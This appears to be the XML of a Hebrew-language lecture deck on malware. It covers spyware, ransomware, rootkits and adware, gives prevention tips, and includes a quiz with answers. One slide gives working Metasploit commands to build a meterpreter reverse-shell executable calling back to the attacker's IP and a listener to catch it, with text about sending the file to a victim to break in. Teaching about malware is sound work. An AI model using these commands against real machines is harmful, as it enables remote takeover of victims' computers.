            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Spyware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רוגלה היא תוכנה זדונית שמטרתה לרגל אחרי המשתמש, כלומר לאסוף מידע אישי כמו סיסמאות, הקשות מקלדת, היסטוריית גלישה ועוד, ללא ידיעת המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> רוגלה בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Keylogger</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמקליטה כל הקשה במקלדת של המשתמש ומשדרת את המידע לתוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="169180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80C4B0-7625-4145-8E6A-E9508929F3AF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4283764" y="642594"/>
            <a:ext cx="6841435" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - סוגי תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DBE21B4B-98BA-47E5-B246-1B3516A00F2C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103119"/>
            <a:ext cx="10058400" cy="4357315"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>5. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>כופרות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Ransomware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כופרה היא סוג של תוכנה זדונית שמצפינה את קבצי המשתמש ודורשת כופר כדי לשחרר אותם. אם הכופר לא משולם, הקבצים נשארים נעולים ולא נגישים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מתקפת כופרה בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> WannaCry</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשנת 2017 הצפינה קבצים במחשבים רבים בעולם ודרשה תשלום </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ביטקוין</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי לשחרר אותם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" dirty="0"/>
              <a:t>6. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0"/>
              <a:t>Rootkits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2400" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2400" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Rootkits</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הם כלים זדוניים שמטרתם להסתיר את פעילותם במערכת ולתת לתוקף שליטה מלאה במחשב הנפגע. הם נכתבים בצורה שמקשה מאוד על גילויים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Rootkit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>בשם</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Stuxnet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הצליח להסתיר את עצמו במערכות תעשייתיות ולגרום נזק פיזי לציוד.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="2600" dirty="0"/>
              <a:t>7. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2600" b="1" dirty="0"/>
              <a:t>Adware</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="2600" b="1" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2600" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Adware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>היא תוכנה שמציגה פרסומות בלתי רצויות במחשב של המשתמש, לעיתים קרובות תוך כדי איסוף מידע על הרגלי הגלישה שלו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>דוגמה:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> תוכנה שמציגה פופ-אפים של פרסומות בכל פעם שהמשתמש פותח דפדפן.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2880141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A58265-E198-42B4-A361-A933E94CE390}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2464904" y="642594"/>
            <a:ext cx="8660296" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>איך מזהים ומונעים תוכנות זדוניות?</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C0819D7A-C3B4-4A42-8FA9-85635C77960A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש באנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: התקנת תוכנת אנטי-וירוס מעודכנת יכולה לסייע בזיהוי ובחסימת תוכנות זדוניות לפני שהן גורמות נזק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכון מערכות ותוכנות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: יש לשמור את מערכת ההפעלה והתוכנות מעודכנות כדי לסגור פרצות אבטחה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הימנעות מהורדות ממקורות לא מוכרים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תמיד להוריד תוכנות רק מאתרים מוכרים ולוודא את האמינות שלהם.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בחומת אש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: חומת אש יכולה לסייע במניעת גישה לא מורשית למחשב או לרשת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22873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09EFD0F-7545-4018-936D-2AD90FBD82B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5227982" y="642594"/>
            <a:ext cx="5897217" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות - תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96C1E3A0-8067-428B-ACA5-B41543AC9BC5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה ההבדל בין וירוס לתולעת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. איך פועל סוס טרויאני?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. מהי כופרה וכיצד היא פועלת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מדוע רוגלה נחשבת למסוכנת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. מהם הצעדים המומלצים להגנה מפני תוכנות זדוניות?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1834283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AC7BA4E-D775-42FD-8308-7D8C163D8723}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4989442" y="642594"/>
            <a:ext cx="6135757" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות - תוכנות זדוניות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59D0E2EA-CAEE-404E-B5DB-831D9A9D8B92}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. וירוס מחייב תוכנה מארחת כדי לפעול ולהתפשט, בעוד שתולעת יכולה לשכפל את עצמה ולהתפשט ללא צורך בתוכנה מארחת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. סוס טרויאני מתחזה לתוכנה לגיטימית, וברגע שהוא מופעל, הוא מאפשר לתוקף גישה למערכת הנפגעת.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. כופרה היא תוכנה זדונית שמצפינה את קבצי המשתמש ודורשת כופר כדי לשחרר אותם. היא מתפשטת לרוב דרך קבצים מצורפים לדוא"ל או הורדות לא חוקיות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. רוגלה מסוכנת כיוון שהיא אוספת מידע אישי רגיש כמו סיסמאות והיסטוריית גלישה ומשדרת אותם לתוקף ללא ידיעת המשתמש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>5. שימוש באנטי-וירוס, עדכון תוכנות, הימנעות מהורדות ממקורות לא מוכרים, ושימוש בחומת אש.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1597893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C78A2B1-09C6-45D3-B201-56B490912862}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7822096" y="0"/>
            <a:ext cx="3303104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמא בקוד:</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B50B5AF9-86A0-48C0-8529-497F18024DD0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1182757"/>
            <a:ext cx="10058400" cy="4852283"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ניצור קובץ זדוני שיבצע חיבור חוזר </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>reverse shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> למחשב התוקף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -p windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> LHOST=&lt;Your IP&gt; LPORT=4444 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>-f exe -o malicious.exe</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0">
              <a:highlight>
                <a:srgbClr val="FFFF00"/>
              </a:highlight>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לאחר שיצרנו את הקובץ הזדוני, עלינו להגדיר מאזין שיקלוט את החיבור מהמחשב הנפגע.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפעל את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>השתמש במודול </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>multi/handler</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> כדי להאזין לחיבור:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגדר את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הפיילוד</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> "אותי" כך שיתאים למה שיצרת קודם:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set payload windows/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>reverse_tcp</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LHOST &lt;Your IP&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התחל את ההאזנה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Run</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>את הקובץ הזה ניתן להעביר לאיזשהו מחשב, אחר שהוא יפתח את הקובץ אנו נפרוץ לו למחשב</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2713096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A7B1F6D0-C489-4947-9BFD-7A7E66507AC3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2361538"/>
            <a:ext cx="10058400" cy="3931920"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="he-IL" sz="9600" dirty="0"/>
              <a:t>וירוס</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2855400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64E6A0-31AC-445A-8A14-B10FC323D0C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9014790" y="642594"/>
            <a:ext cx="2110409" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקדמה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{89A9C5F0-4236-4F74-9FBC-2813B09C09C0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>מהו וירוס: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וירוס הוא סוג של תוכנה זדונית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> malware </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שנועדה לגרום נזק, לגנוב מידע, או לבצע פעולות זדוניות אחרות על מחשב או מערכת מחשבים. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עצמו הוא קוד תוכנה שמחובר לתוכנה אחרת, ובדרך כלל מפיץ את עצמו ממחשב אחד לאחר על ידי "הדבקה" של קבצים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>איך וירוס עובד? </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>וירוס מתפשט על ידי הצמדת עצמו לקובץ שניתן להריץ, כמו קובץ תוכנה, מסמך, או קובץ מערכת. כאשר הקובץ הנגוע מופעל, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> גם הוא מופעל, ואז יכול לבצע את הפעולות הזדוניות שלו. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הוירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול להתפשט למחשבים אחרים דרך רשתות, מדיה נשלפת כמו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
